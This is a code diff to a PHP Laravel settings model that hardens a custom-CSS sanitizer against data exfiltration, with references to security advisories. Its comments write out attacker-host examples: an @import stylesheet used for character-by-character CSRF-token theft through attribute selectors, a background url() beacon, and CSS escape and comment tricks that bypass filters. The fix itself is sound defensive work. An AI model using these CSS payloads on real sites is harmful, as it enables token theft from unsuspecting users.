@@ -3,6 +3,8 @@
 namespace App\Models;
 
 use App\Helpers\Helper;
+use App\Models\Labels\CustomUserLabel;
+use App\Models\Labels\Label;
 use App\Rules\CssColor;
 use Carbon\Carbon;
 use Illuminate\Database\Eloquent\Casts\Attribute;
@@ -17,6 +19,8 @@ use Watson\Validating\ValidatingTrait;
 
 /**
  * Settings model.
+ *
+ * @mixin IdeHelperSetting
  */
 class Setting extends Model
 {
@@ -75,6 +79,11 @@ class Setting extends Model
         'manager_view_enabled' => 'boolean',
         'block_api_user_agents' => 'boolean',
         'block_blank_api_user_agents' => 'boolean',
+        // tinyInteger with no cast was leaking 0 (int) into call sites that
+        // use loose-equality string checks like `== '1'` and `== ''`. Under
+        // PHP 8 `0 == ''` is false, so checks expecting "disabled" misfired.
+        // Normalize on read so every consumer sees a consistent string mode.
+        'two_factor_enabled' => 'string',
     ];
 
     /**
@@ -204,9 +213,9 @@ class Setting extends Model
      *
      * Important: Do not remove the e() escaping here, as we output raw in the blade.
      *
-     * @return string escaped CSS
-     *
      * @author A. Gianotto <snipe@snipe.net>
+     *
+     * @return Attribute<string, mixed>
      */
     protected function headerColor(): Attribute
     {
@@ -215,6 +224,9 @@ class Setting extends Model
         );
     }
 
+    /**
+     * @return Attribute<string, mixed>
+     */
     protected function linkLightColor(): Attribute
     {
         return Attribute::make(
@@ -222,6 +234,9 @@ class Setting extends Model
         );
     }
 
+    /**
+     * @return Attribute<string, mixed>
+     */
     protected function linkDarkColor(): Attribute
     {
         return Attribute::make(
@@ -229,6 +244,9 @@ class Setting extends Model
         );
     }
 
+    /**
+     * @return Attribute<string, mixed>
+     */
     protected function navLinkColor(): Attribute
     {
         return Attribute::make(
@@ -239,14 +257,139 @@ class Setting extends Model
     public function show_custom_css(): string
     {
         $custom_css = self::getSettings()->custom_css;
-        $custom_css = e($custom_css);
-        // Needed for modifying the bootstrap nav :(
-        $custom_css = str_ireplace('script', 'SCRIPTS-NOT-ALLOWED-HERE', $custom_css);
-        $custom_css = str_replace('&gt;', '>', $custom_css);
-        // Allow String output (needs quotes)
-        $custom_css = str_replace('&quot;', '"', $custom_css);
+        if ($custom_css === null || $custom_css === '') {
+            return '';
+        }
+
+        // Superuser-planted CSS renders inside <style> on every layout for
+        // every user, so the sanitize step has to hold up as a
+        // CSS filter, not just an HTML filter. Two abuse primitives to
+        // shut down:
+        //
+        //   @import url("https://attacker.example/x.css") lets the planter
+        //   load an unrestricted external stylesheet, which can then use
+        //   attribute-selector rules (input[name="_token"][value^="a"]{...})
+        //   to exfiltrate CSRF tokens character by character on every page
+        //   load.
+        //
+        //   background: url("https://attacker.example/?t=...") reaches the
+        //   same primitive without @import as long as the value is any
+        //   absolute or protocol-relative URL. Same-origin relative paths
+        //   under /uploads/ etc. are fine for legit branding assets.
+        //
+        // strip_tags guards against injection reaching a
+        // context that treats < as an HTML boundary. The old encode-then-
+        // selectively-decode chain silently undid its own work on > and "
+        // and did not touch either @import or url(), so it is gone.
+        $custom_css = strip_tags($custom_css);
+
+        // CSS lets you write hex escapes (`\XXXXXX`, optional trailing
+        // whitespace) and single-char escapes (`\X`) inside identifiers
+        // and strings. Browsers decode `@\69 mport` to `@import` at parse
+        // time. GHSA-gc22-r333-8q45 reported this bypass of the source-
+        // text regex below. Instead of mirroring CSS's escape decoder,
+        // refuse to render any CSS containing a backslash. Legitimate
+        // custom branding CSS does not need escape sequences, and the
+        // url() guard further down already applies this same rule to
+        // url() values for the same reason.
+        if (str_contains($custom_css, '\\')) {
+            return '';
+        }
+
+        // CSS comments are stripped during tokenization at every position
+        // except inside strings, so `@im/*c*/port` parses as `@import` in
+        // a browser. Strip comments here first so the at-rule and url()
+        // regexes below see the same token stream the browser will.
+        $custom_css = preg_replace('#/\*.*?\*/#s', '', (string) $custom_css);
+
+        // \b (word boundary) instead of \s+ so `@import"url"` and
+        // `@import/*c*/"url"` (both valid CSS tokenizations that a
+        // \s+ pattern would leave in place) still get stripped. \b
+        // sits between the `t` of `@import` and any non-word character
+        // that follows (string quote, `/`, whitespace, etc.), so any
+        // legal CSS token immediately after the at-keyword triggers
+        // the match. `@importfoo` won't match (no word boundary
+        // between two word chars), and `@importfoo` isn't a valid CSS
+        // at-rule anyway.
+        $custom_css = preg_replace('/@import\b[^;]*;?/i', '', $custom_css);
+
+        // Strip CSS image-loading functions that aren't url(). image(),
+        // image-set(), cross-fade() (and the -webkit- variants) all
+        // reach the same external-resource fetch primitive the url()
+        // allowlist below exists to gate.
+        $custom_css = self::stripImageLoadingFunctions($custom_css);
+
+        $custom_css = preg_replace_callback(
+            '/\burl\s*\(\s*([^)]*)\)/i',
+            function (array $match): string {
+                $value = trim($match[1], " \t\n\r\"'");
+
+                // Reject any url() value containing a backslash. CSS lets
+                // you write `\2F\2F attacker.example` or `\/\/ attacker.example`
+                // and the browser resolves those escape sequences to
+                // `//attacker.example` at render time. Testing the raw
+                // literal against the scheme regex below would miss the
+                // bypass.
+                if ($value === '' || str_contains($value, '\\')) {
+                    return '';
+                }
+
+                // Allowlist rather than denylist: reject any value that
+                // starts with a URI scheme (`scheme:`, with or without
+                // `//`) or a protocol-relative `//`. Same-origin relative
+                // paths (`/uploads/logos/foo.png`, `images/foo.png`) pass.
+                // The old denylist required `//` after the scheme, which
+                // missed shapes like `http:127.0.0.1:9931/bg` that
+                // browsers still resolve to a cross-origin fetch when the
+                // page scheme differs from the URL scheme. Branding
+                // assets go through the settings-UI upload flow and land
+                // under /uploads/, so custom CSS never needs external
+                // scheme URLs. See GHSA-v279-2q6w-g8j4.
+                if (preg_match('#^[a-zA-Z][a-zA-Z0-9+.-]*:|^//#', $value)) {
+                    return '';
+                }
+
+                return $match[0];
+            },
+            $custom_css,
+        );
 
         return $custom_css;
+    }
+
+    /**
+     * Strip every image-loading CSS function call that isn't url().
+     * Covers image(), image-set(), cross-fade(), and the -webkit-
+     * prefixed variants. Uses balanced-paren walking so a nested
+     * url() inside image-set() does not fool the stripper into
+     * stopping at the inner close paren. Case-insensitive, matches
+     * whitespace between the function name and the open paren.
+     */
+    private static function stripImageLoadingFunctions(string $css): string
+    {
+        $pattern = '/\b(?:-webkit-)?(?:image-set|image|cross-fade)\s*\(/i';
+        $result = '';
+        $pos = 0;
+        $len = strlen($css);
+
+        while (preg_match($pattern, $css, $m, PREG_OFFSET_CAPTURE, $pos)) {
+            $matchStart = $m[0][1];
+            $result .= substr($css, $pos, $matchStart - $pos);
+
+            $depth = 1;
+            $i = $matchStart + strlen($m[0][0]);
+            while ($i < $len && $depth > 0) {
+                if ($css[$i] === '(') {
+                    $depth++;
+                } elseif ($css[$i] === ')') {
+                    $depth--;
+                }
+                $i++;
+            }
+            $pos = $i;
+        }
+
+        return $result.substr($css, $pos);
     }
 
     public function isQrEnabled(): bool
@@ -439,5 +582,26 @@ class Setting extends Model
     public static function get_client_side_key_path()
     {
         return self::get_fresh_file_path('ldap_client_tls_key', 'ldap_client_tls.key');
+    }
+
+    public function getLabel2TemplateDisplayAttribute(): string
+    {
+        $value = $this->label2_template;
+
+        if (! $value) {
+            return 'DefaultLabel';
+        }
+
+        if (str_starts_with($value, 'custom:')) {
+            $id = (int) str_replace('custom:', '', $value);
+
+            return CustomUserLabel::find($id)->name ?? $value;
+        }
+
+        try {
+            return Label::find($value)?->getName() ?? $value;
+        } catch (\Throwable $e) {
+            return $value;
+        }
     }
 }
